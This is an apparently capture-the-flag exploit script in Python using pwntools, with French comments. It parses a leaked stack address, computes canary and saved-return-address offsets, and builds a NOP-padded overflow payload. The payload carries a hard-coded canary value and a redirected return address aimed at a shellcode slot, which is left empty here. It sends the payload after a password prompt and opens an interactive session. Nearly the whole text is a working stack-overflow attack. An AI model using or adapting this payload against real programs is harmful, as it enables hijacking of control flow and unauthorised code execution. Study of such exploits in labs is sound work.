#  aParsing de l'adresse du buffer divulguée
# io.recvuntil(b"at ")
raw = io.recvuntil(b"\n\n", drop=True)
m = re.search(rb"0x[0-9a-fA-F]+", raw)
leak_addr = int(m.group(0), 16)

# Dimensions et offsets relatifs à leak_addr (en bytes)
canary_offset = 15
canary_size = 8
saved_rip_offset = 39

# Adresses utiles
saved_rip_addr = leak_addr + saved_rip_offset
shellcode_addr = saved_rip_addr + 8

# Payload
pad_before_canary = b"\x90" * canary_offset
canary = p64(int("DEADBEEFDEADBEEF", 16), endianness="little")
pad_after_canary = b"\x90" * (saved_rip_offset - (canary_offset + canary_size))
effective_return_addr = p64(shellcode_addr, endianness="little")
shellcode = b""
print(f"effective_return_addr: {effective_return_addr}\n")
payload = (
    pad_before_canary + canary + pad_after_canary + effective_return_addr + shellcode
)
print(payload)
# Injection
io.sendlineafter(b"passe:\n", payload)
io.interactive()
